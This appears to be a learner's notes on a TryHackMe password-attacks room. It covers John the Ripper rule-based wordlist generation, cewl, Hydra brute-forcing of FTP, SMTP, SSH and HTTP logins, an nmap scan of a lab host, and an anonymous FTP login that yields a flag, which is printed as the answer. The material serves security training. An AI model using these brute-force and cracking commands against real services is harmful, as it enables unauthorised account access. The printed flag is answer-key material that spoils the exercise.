┌──(kali㉿kali)-[~]
└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d "."
cut: you must specify a list of bytes, characters, or fields
Try 'cut --help' for more information.
                                                                          
┌──(kali㉿kali)-[~]
└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3




Rules:JumboSingle]















Rules:o1]
Rules:o2]




Rules:i1]
Rules:i2]

Rules:o1]
Rules:i1]
Rules:o2]
Rules:i2]









Rules:best64]
Rules:d3ad0ne]
Rules:dive]
Rules:InsidePro]
Rules:T0XlC]
Rules:rockyou-30000]
Rules:specific]



Rules:ShiftToggle]
Rules:Split]

Rules:Single]
Rules:Extra]
Rules:OldOffice]

Rules:Single-Extra]
Rules:Wordlist]
Rules:ShiftToggle]
Rules:Multiword]
Rules:best64]
Rules:UnicodeSubstitution]

Rules:Jumbo]
Rules:KoreLogic]
Rules:T9]
Rules:hashcat]
                                                                          
┌──(kali㉿kali)-[~]
└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d"." -f2




Rules:JumboSingle]















Rules:o1]
Rules:o2]




Rules:i1]
Rules:i2]

Rules:o1]
Rules:i1]
Rules:o2]
Rules:i2]









Rules:best64]
Rules:d3ad0ne]
Rules:dive]
Rules:InsidePro]
Rules:T0XlC]
Rules:rockyou-30000]
Rules:specific]



Rules:ShiftToggle]
Rules:Split]

Rules:Single]
Rules:Extra]
Rules:OldOffice]

Rules:Single-Extra]
Rules:Wordlist]
Rules:ShiftToggle]
Rules:Multiword]
Rules:best64]
Rules:UnicodeSubstitution]

Rules:Jumbo]
Rules:KoreLogic]
Rules:T9]
Rules:hashcat]
                                                                          
┌──(kali㉿kali)-[~]
└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d"."-f2 
cut: the delimiter must be a single character
Try 'cut --help' for more information.
                                                                          
┌──(kali㉿kali)-[~]
└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d"." -f2




Rules:JumboSingle]















Rules:o1]
Rules:o2]




Rules:i1]
Rules:i2]

Rules:o1]
Rules:i1]
Rules:o2]
Rules:i2]









Rules:best64]
Rules:d3ad0ne]
Rules:dive]
Rules:InsidePro]
Rules:T0XlC]
Rules:rockyou-30000]
Rules:specific]



Rules:ShiftToggle]
Rules:Split]

Rules:Single]
Rules:Extra]
Rules:OldOffice]

Rules:Single-Extra]
Rules:Wordlist]
Rules:ShiftToggle]
Rules:Multiword]
Rules:best64]
Rules:UnicodeSubstitution]

Rules:Jumbo]
Rules:KoreLogic]
Rules:T9]
Rules:hashcat]
                                                                          
┌──(kali㉿kali)-[~]
└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d":" -f2           




JumboSingle]















o1]
o2]




i1]
i2]

o1]
i1]
o2]
i2]









best64]
d3ad0ne]
dive]
InsidePro]
T0XlC]
rockyou-30000]
specific]



ShiftToggle]
Split]

Single]
Extra]
OldOffice]

Single-Extra]
Wordlist]
ShiftToggle]
Multiword]
best64]
UnicodeSubstitution]

Jumbo]
KoreLogic]
T9]
hashcat]
                                                                          
┌──(kali㉿kali)-[~]
└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d":" -f2| cut -d"]" -f1




JumboSingle















o1
o2




i1
i2

o1
i1
o2
i2









best64
d3ad0ne
dive
InsidePro
T0XlC
rockyou-30000
specific



ShiftToggle
Split

Single
Extra
OldOffice

Single-Extra
Wordlist
ShiftToggle
Multiword
best64
UnicodeSubstitution

Jumbo
KoreLogic
T9
hashcat
                                                                          
┌──(kali㉿kali)-[~]
└─$ cat /etc/john/john.conf | grep "List.Rules" | cut -d"." -f3| cut -d":" -f2| cut -d"]" -f1 | awk NF
JumboSingle
o1
o2
i1
i2
o1
i1
o2
i2
best64
d3ad0ne
dive
InsidePro
T0XlC
rockyou-30000
specific
ShiftToggle
Split
Single
Extra
OldOffice
Single-Extra
Wordlist
ShiftToggle
Multiword
best64
UnicodeSubstitution
Jumbo
KoreLogic
T9
hashcat

```

We can see that we have many rules that are available for us to use. We will create a wordlist with only one password containing the string tryhackme, to see how we can expand the wordlist. Let's choose one of the rules, the best64 rule, which contains the best 64 built-in John rules, and see what it can do!

```
Rule-based attack

           
user@machine$ john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
76p 0:00:00:00 100.00% (2021-10-11 13:42) 1266p/s pordpo
76

        
```

```
──(kali㉿kali)-[/tmp]
└─$ nano single-password-list.txt
                                                                          
┌──(kali㉿kali)-[/tmp]
└─$ cd /home/kali/Downloads
                                                                          
┌──(kali㉿kali)-[~/Downloads]
└─$ john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
75p 0:00:00:00 100.00% (2022-09-10 14:03) 750.0p/s tckmet
75

```

--wordlist= to specify the wordlist or dictionary file. 

--rules to specify which rule or rules to use.

--stdout to print the output to the terminal.

|wc -l  to count how many lines John produced.

By running the previous command, we expand our password list from 1 to 76 passwords. Now let's check another rule, one of the best rules in John, KoreLogic. KoreLogic uses various built-in and custom rules to generate complex password lists. For more information, please visit this website here. Now let's use this rule and check whether the Tryh@ckM3 is available in our list!

```
           
user@machine$ john --wordlist=single-password-list.txt --rules=KoreLogic --stdout |grep "Tryh@ckm3"
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
Tryh@ckm3
7089833p 0:00:00:02 100.00% (2021-10-11 13:56) 3016Kp/s tryhackme999999

        
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ john --wordlist=/tmp/single-password-list.txt --rules=KoreLogic --stdout |grep "Tryh@ckm3"
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
Tryh@ckm3
Tryh@ckm3
7089833p 0:00:00:05 100.00% (2022-09-10 14:11) 1259Kp/s tryhackme999999
```

The output from the previous command shows that our list has the complex version of tryhackme, which is Tryh@ckM3. Finally, we recommend checking out all the rules and finding one that works the best for you. Many rules apply combinations to an existing wordlist and expand the wordlist to increase the chance of finding a valid password!
Custom Rules

John the ripper has a lot to offer. For instance, we can build our own rule(s) and use it at run time while john is cracking the hash or use the rule to build a custom wordlist!

	Let's say we wanted to create a custom wordlist from a pre-existing dictionary with custom modification to the original dictionary. The goal is to add special characters (ex: !@#$*&) to the beginning of each word and add numbers 0-9 at the end. The format will be as follows:

	[symbols]word[0-9]

We can add our rule to the end of john.conf:

```
John Rules

           
user@machine$ sudo vi /etc/john/john.conf 
[List.Rules:THM-Password-Attacks] 
Az"[0-9]" ^[!@#$]
        
```

	[List.Rules:THM-Password-Attacks]  specify the rule name THM-Password-Attacks.

Az represents a single word from the original wordlist/dictionary using -p.

	"[0-9]" append a single digit (from 0 to 9) to the end of the word. For two digits, we can add "[0-9][0-9]"  and so on.  

^[!@#$] add a special character at the beginning of each word. ^ means the beginning of the line/word. Note, changing ^ to $ will append the special characters to the end of the line/word.

Now let's create a file containing a single word password to see how we can expand our wordlist using this rule.

```
           
user@machine$ echo "password" > /tmp/single.lst
        

```

We include the name of the rule we created in the John command using the --rules option. We also need to show the result in the terminal. We can do this by using --stdout as follows:

```
John Rules

           
user@machine$ john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout 
Using default input encoding: UTF-8 
!password0 
@password0 
#password0 
$password0
        

```

```
┌──(kali㉿kali)-[/tmp]
└─$ john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout  
Using default input encoding: UTF-8
!password0
@password0
#password0
$password0
!password1
@password1
#password1
$password1
!password2
@password2
#password2
$password2
!password3
@password3
#password3
$password3
!password4
@password4
#password4
$password4
!password5
@password5
#password5
$password5
!password6
@password6
#password6
$password6
!password7
@password7
#password7
$password7
!password8
@password8
#password8
$password8
!password9
@password9
#password9
$password9
40p 0:00:00:00 100.00% (2022-09-10 14:30) 285.7p/s $password9

```

Now it's practice time to create your own rule.



	What would the syntax you would use to create a rule to produce the following: "S[Word]NN  where N is Number and S is a symbol of !@? 

	(Az"[0-9][0-9]" ^[**] = Example: @password80 )

	Az"[0-9][0-9]" ^[!@] 

###  Deploy the VM 

Deploy the attached VM to apply the knowledge we discussed in this room. The attached VM has various online services to perform password attacks on. Custom wordlists are needed to find valid credentials.

We recommend using https://clinic.thmredteam.com/ to create your custom wordlist.

To generate your wordlist using cewl against the website:

```John Rules

user@machine$ cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/  

```

Note that you will also need to generate a username wordlist as shown in Task 3: Password Profiling #1 for the online attack questions.

Get your pentest weapons ready to attack 10.10.163.182.
*No answer needed*

###  Online password attacks 

Online password attacks involve guessing passwords for networked services that use a username and password authentication scheme, including services such as HTTP, SSH, VNC, FTP, SNMP, POP3, etc. This section showcases using hydra which is a common tool used in attacking logins for various network services.

Hydra

Hydra supports an extensive list of network services to attack. Using hydra, we'll brute-force network services such as web login pages, FTP, SMTP, and SSH in this section. Often, within hydra, each service has its own options and the syntax hydra expects takes getting used to. It's important to check the help options for more information and features.

FTP

In the following scenario, we will perform a brute-force attack against an FTP server. By checking the hydra help options, we know the syntax of attacking the FTP server is as follows:

```
FTP

           
user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x

        
```

-l ftp we are specifying a single username, use-L for a username wordlist

-P Path specifying the full path of wordlist, you can specify a single password by using -p.

ftp://10.10.x.x the protocol and the IP address or the fully qualified domain name (FDQN) of the target.

Remember that sometimes you don't need to brute-force and could first try default credentials. Try to attack the FTP server on the attached VM and answer the question below.

SMTP

Similar to FTP servers, we can also brute-force SMTP servers using hydra. The syntax is similar to the previous example. The only difference is the targeted protocol. Keep in mind, if you want to try other online password attack tools, you may need to specify the port number, which is 25. Make sure to read the help options of the tool.

```
SMTP

           
user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking smtp://10.10.x.x:25/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[25][smtp] host: 10.10.x.x   login: email@company.xyz password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found

        
```

SSH

SSH brute-forcing can be common if your server is accessible to the Internet. Hydra supports many protocols, including SSH. We can use the previous syntax to perform our attack! It's important to notice that password attacks rely on having an excellent wordlist to increase your chances of finding a valid username and password.

```
SSH

           
user@machine$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:48:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ssh://10.10.x.x:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://user@10.10.x.x:22
[INFO] Successful, password authentication is supported by ssh://10.10.x.x:22
[22][ssh] host: 10.10.x.x   login: victim   password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found

        
```

HTTP login pages

In this scenario, we will brute-force HTTP login pages. To do that, first, you need to understand what you are brute-forcing. Using hydra, it is important to specify the type of HTTP request, whether GET or POST. Checking hydra options: hydra http-get-form -U, we can see that hydra has the following syntax for the http-get-form option:

	<url>:<form parameters>:<condition string>[:<optional>[:<optional>]

As we mentioned earlier, we need to analyze the HTTP request that we need to send, and that could be done either by using your browser dev tools or using a web proxy such as Burp Suite.

```
hydra

           
user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (http://www.thc.org/thc-hydra) starting at 2021-10-13 08:06:22 
[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task 
[DATA] attacking http-get-form://10.10.x.x:80//login-get/index.php:username=^USER^&password=^PASS^:S=logout.php 
[80][http-get-form] host: 10.10.x.x   login: admin password: xxxxxx 
1 of 1 target successfully completed, 1 valid password found 
Hydra (http://www.thc.org/thc-hydra) 
finished at 2021-10-13 08:06:45

        
```

-l admin  we are specifying a single username, use-L for a username wordlist

-P Path specifying the full path of wordlist, you can specify a single password by using -p.

10.10.x.x the IP address or the fully qualified domain name (FDQN) of the target.

http-get-form the type of HTTP request, which can be either http-get-form or http-post-form.

Next, we specify the URL, path, and conditions that are split using :

login-get/index.php the path of the login page on the target webserver.

username=^USER^&password=^PASS^ the parameters to brute-force, we inject ^USER^ to brute force usernames and ^PASS^ for passwords from the specified dictionary.

The following section is important to eliminate false positives by specifying the 'failed' condition with F=.

And success conditions, S=. You will have more information about these conditions by analyzing the webpage or in the enumeration stage! What you set for these values depends on the response you receive back from the server for a failed login attempt and a successful login attempt. For example, if you receive a message on the webpage 'Invalid password' after a failed login, set F=Invalid Password.

Or for example, during the enumeration, we found that the webserver serves logout.php. After logging into the login page with valid credentials, we could guess that we will have logout.php somewhere on the page. Therefore, we could tell hydra to look for the text logout.php within the HTML for every request.

S=logout.php the success condition to identify the valid credentials

-f to stop the brute-forcing attacks after finding a valid username and password

You can try it out on the attached VM by visiting http://10.10.163.182/login-get/index.php. Make sure to deploy the attached VM if you haven't already to answer the questions below.

Finally, it is worth it to check other online password attacks tools to expand your knowledge, such as:

    Medusa
    Ncrack
    others!

```
──(kali㉿kali)-[/tmp]
└─$ rustscan -a 10.10.163.182 --ulimit 5000 -b 65535 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.163.182:21
Open 10.10.163.182:22
Open 10.10.163.182:25
Open 10.10.163.182:80
Open 10.10.163.182:465
Open 10.10.163.182:587
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-10 14:56 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:56
Completed NSE at 14:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:56
Completed NSE at 14:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:56
Completed NSE at 14:56, 0.00s elapsed
Initiating Ping Scan at 14:56
Scanning 10.10.163.182 [2 ports]
Completed Ping Scan at 14:56, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:56
Completed Parallel DNS resolution of 1 host. at 14:56, 0.02s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:56
Scanning 10.10.163.182 [6 ports]
Discovered open port 80/tcp on 10.10.163.182
Discovered open port 587/tcp on 10.10.163.182
Discovered open port 21/tcp on 10.10.163.182
Discovered open port 22/tcp on 10.10.163.182
Discovered open port 25/tcp on 10.10.163.182
Discovered open port 465/tcp on 10.10.163.182
Completed Connect Scan at 14:56, 0.20s elapsed (6 total ports)
Initiating Service scan at 14:56
Scanning 6 services on 10.10.163.182
Completed Service scan at 14:57, 21.40s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.163.182.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:57
NSE: [ftp-bounce 10.10.163.182:21] PORT response: 500 Illegal PORT command.
Completed NSE at 14:57, 6.39s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:57
Completed NSE at 14:57, 5.36s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:57
Completed NSE at 14:57, 0.00s elapsed
Nmap scan report for 10.10.163.182
Host is up, received syn-ack (0.20s latency).
Scanned at 2022-09-10 14:56:41 EDT for 34s

PORT    STATE SERVICE  REASON  VERSION
21/tcp  open  ftp      syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 111      116          4096 Oct 12  2021 files
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.81.220
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:a7:30:6b:42:50:5b:71:48:f4:65:1f:bb:ec:68:08 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDkZs1N3VIYfwGvzJnhrWaW26CQXUMuYKANJ9rR7nSSOesa454jN5Tu8M3T9e3l5+4YpD/EI7Mwo2bZJr0hKroWa10LsUjDGQIbWrurROm5k4MEilnR0citMvyLms2nCfANr0GmxxmW2wPSwVFIs+S23dgHLpJiUhamK7cFKLnCXTMqb7NivaaLF036hogqC5MV78CF4VQGcAR1drpeLG4JPJfbJrTn4HPYRQecKHK3jLfcOM0RgSs8hl2sVMuucDnp9+EbzNMCQLKqpRU00kZtRxpfyg7P3ozNlkmx8yaBBTJMgoQCCkdUxS9NYhTF5ZWj8CcFFrgbGaNj1iLsvy8j
|   256 f5:e1:e9:36:2a:33:f1:28:72:db:53:d9:fd:9f:bc:a4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdw+BBBiNEnurJxLp5CgOgIFYZz8yBtDpCyrASbzqTTL3BtQSjrx75ONNF748jHaBwLJf9sZ4YRWUOUnbdSLto=
|   256 6b:26:8c:be:aa:b9:bb:69:f1:ac:48:a0:3e:54:7d:98 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKIS8haBZspzTnXK0X2JNg7UOXYdgYUiIyEDrr6UZy2r
25/tcp  open  smtp     syn-ack Postfix smtpd
|_smtp-commands: mail.thm.labs, PIPELINING, SIZE 10240000, ETRN, STARTTLS, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-07T08:49:39
| Not valid after:  2031-10-05T08:49:39
| MD5:   de62 d0c4 2dde e2ae b25a baff e13b 53dd
| SHA-1: 9c46 cdca e7f0 ba52 1c94 9aaf 2dbe 9c09 50ff cf05
| -----BEGIN CERTIFICATE-----
| MIIC2TCCAcGgAwIBAgIUOhXLt0NbbqKtLc4qeXJABA7EubEwDQYJKoZIhvcNAQEL
| BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTIxMTAwNzA4NDkzOVoXDTMxMTAw
| NTA4NDkzOVowFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEAxsH3viB1qqz6ACaeUKSklzRxt6S2PMk+loYQpZxEPC1Y
| hD538y4scOhcUw+lxleGzyMCTKtvhaVnNslVfHYUYauV1Xx65aDAgB46Lh8dC+OA
| 55q9JF3VsEQ+s1IX8qTHifQB/k+Pgf+X3mQRsK9vcBUaemnOOhFZOguI814ylZVf
| KyL2X6NblHvuD+xeI5aAZVN+IZrGD2jR4y1r9ZNx5NJrO2BWG5dI30jI+cXeCiy5
| fpc/Tzb8qvNt16HoqUONojRr8zHsWp4vMgaMf0abMapyNBWVRfNz3/+bzlVW4K72
| JclftLI1m6yq7KXat5iv8HjkiWDs4rUl9iDeyV9AowIDAQABoyMwITAJBgNVHRME
| AjAAMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDANBgkqhkiG9w0BAQsFAAOCAQEAWxbJ
| zAoJdrId3UaTCp5IJ5xDmp18qYhbwl9mBrBpitT35T+q9aAQwe5pv4w5TWVYMaQe
| LoWtDryXZrLDfQF9vz3toQixYeroFAoQJUIREJcF2gJKAhGyJXKWd2I5EQsxumI4
| zJwJ10a+X1FYo0nmtNTI7kLZxsDb/gF9nJxaulpPBoxPRPnD+r2IALilMzvXNHaY
| LntWvUVjvqk/LeoFajoxszY/YhUIGf1Fmn0xaMvEekbtKt9VW8+VChf2IPS4zQRn
| oRLWLrjPxeehDwEbtpNHFHWFVfd/Lvji49nLn3bLwDuYK0RY6S4A/D7qjUmSsi0Z
| HCVAxfEwzLa3NwbXQw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http     syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
465/tcp open  ssl/smtp syn-ack Postfix smtpd
|_smtp-commands: mail.thm.labs, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-07T08:49:39
| Not valid after:  2031-10-05T08:49:39
| MD5:   de62 d0c4 2dde e2ae b25a baff e13b 53dd
| SHA-1: 9c46 cdca e7f0 ba52 1c94 9aaf 2dbe 9c09 50ff cf05
| -----BEGIN CERTIFICATE-----
| MIIC2TCCAcGgAwIBAgIUOhXLt0NbbqKtLc4qeXJABA7EubEwDQYJKoZIhvcNAQEL
| BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTIxMTAwNzA4NDkzOVoXDTMxMTAw
| NTA4NDkzOVowFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEAxsH3viB1qqz6ACaeUKSklzRxt6S2PMk+loYQpZxEPC1Y
| hD538y4scOhcUw+lxleGzyMCTKtvhaVnNslVfHYUYauV1Xx65aDAgB46Lh8dC+OA
| 55q9JF3VsEQ+s1IX8qTHifQB/k+Pgf+X3mQRsK9vcBUaemnOOhFZOguI814ylZVf
| KyL2X6NblHvuD+xeI5aAZVN+IZrGD2jR4y1r9ZNx5NJrO2BWG5dI30jI+cXeCiy5
| fpc/Tzb8qvNt16HoqUONojRr8zHsWp4vMgaMf0abMapyNBWVRfNz3/+bzlVW4K72
| JclftLI1m6yq7KXat5iv8HjkiWDs4rUl9iDeyV9AowIDAQABoyMwITAJBgNVHRME
| AjAAMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDANBgkqhkiG9w0BAQsFAAOCAQEAWxbJ
| zAoJdrId3UaTCp5IJ5xDmp18qYhbwl9mBrBpitT35T+q9aAQwe5pv4w5TWVYMaQe
| LoWtDryXZrLDfQF9vz3toQixYeroFAoQJUIREJcF2gJKAhGyJXKWd2I5EQsxumI4
| zJwJ10a+X1FYo0nmtNTI7kLZxsDb/gF9nJxaulpPBoxPRPnD+r2IALilMzvXNHaY
| LntWvUVjvqk/LeoFajoxszY/YhUIGf1Fmn0xaMvEekbtKt9VW8+VChf2IPS4zQRn
| oRLWLrjPxeehDwEbtpNHFHWFVfd/Lvji49nLn3bLwDuYK0RY6S4A/D7qjUmSsi0Z
| HCVAxfEwzLa3NwbXQw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
587/tcp open  smtp     syn-ack Postfix smtpd
|_smtp-commands: mail.thm.labs, PIPELINING, SIZE 10240000, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-07T08:49:39
| Not valid after:  2031-10-05T08:49:39
| MD5:   de62 d0c4 2dde e2ae b25a baff e13b 53dd
| SHA-1: 9c46 cdca e7f0 ba52 1c94 9aaf 2dbe 9c09 50ff cf05
| -----BEGIN CERTIFICATE-----
| MIIC2TCCAcGgAwIBAgIUOhXLt0NbbqKtLc4qeXJABA7EubEwDQYJKoZIhvcNAQEL
| BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTIxMTAwNzA4NDkzOVoXDTMxMTAw
| NTA4NDkzOVowFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEAxsH3viB1qqz6ACaeUKSklzRxt6S2PMk+loYQpZxEPC1Y
| hD538y4scOhcUw+lxleGzyMCTKtvhaVnNslVfHYUYauV1Xx65aDAgB46Lh8dC+OA
| 55q9JF3VsEQ+s1IX8qTHifQB/k+Pgf+X3mQRsK9vcBUaemnOOhFZOguI814ylZVf
| KyL2X6NblHvuD+xeI5aAZVN+IZrGD2jR4y1r9ZNx5NJrO2BWG5dI30jI+cXeCiy5
| fpc/Tzb8qvNt16HoqUONojRr8zHsWp4vMgaMf0abMapyNBWVRfNz3/+bzlVW4K72
| JclftLI1m6yq7KXat5iv8HjkiWDs4rUl9iDeyV9AowIDAQABoyMwITAJBgNVHRME
| AjAAMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDANBgkqhkiG9w0BAQsFAAOCAQEAWxbJ
| zAoJdrId3UaTCp5IJ5xDmp18qYhbwl9mBrBpitT35T+q9aAQwe5pv4w5TWVYMaQe
| LoWtDryXZrLDfQF9vz3toQixYeroFAoQJUIREJcF2gJKAhGyJXKWd2I5EQsxumI4
| zJwJ10a+X1FYo0nmtNTI7kLZxsDb/gF9nJxaulpPBoxPRPnD+r2IALilMzvXNHaY
| LntWvUVjvqk/LeoFajoxszY/YhUIGf1Fmn0xaMvEekbtKt9VW8+VChf2IPS4zQRn
| oRLWLrjPxeehDwEbtpNHFHWFVfd/Lvji49nLn3bLwDuYK0RY6S4A/D7qjUmSsi0Z
| HCVAxfEwzLa3NwbXQw==
|_-----END CERTIFICATE-----
Service Info: Host: mail.thm.labs; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:57
Completed NSE at 14:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:57
Completed NSE at 14:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:57
Completed NSE at 14:57, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.93 seconds

```


```
┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.163.182
Connected to 10.10.163.182.
220 (vsFTPd 3.0.3)
Name (10.10.163.182:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||39653|)
c150 Here comes the directory listing.
drwxr-xr-x    2 111      116          4096 Oct 12  2021 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||63306|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              38 Oct 12  2021 flag.txt
226 Directory send OK.
ftp> more flag.txt
THM{d0abe799f25738ad739c20301aed357b}

```

Can you guess the FTP credentials without brute-forcing? What is the flag?
*THM{d0abe799f25738ad739c20301aed357b}*

```
┌──(kali㉿kali)-[~]
└─$ tail -f /etc/john/john.conf

# include john-local.conf in local dir, it can override john.conf, john-local.conf (or any other conf file loaded)
# This is disabled by default since it's a security risk in case JtR is ever run with untrusted current directory
#.include './john-local.conf'

# End of john.conf file.
# Keep this comment, and blank line above it, to make sure a john-local.conf
# that does not end with \n is properly loaded.
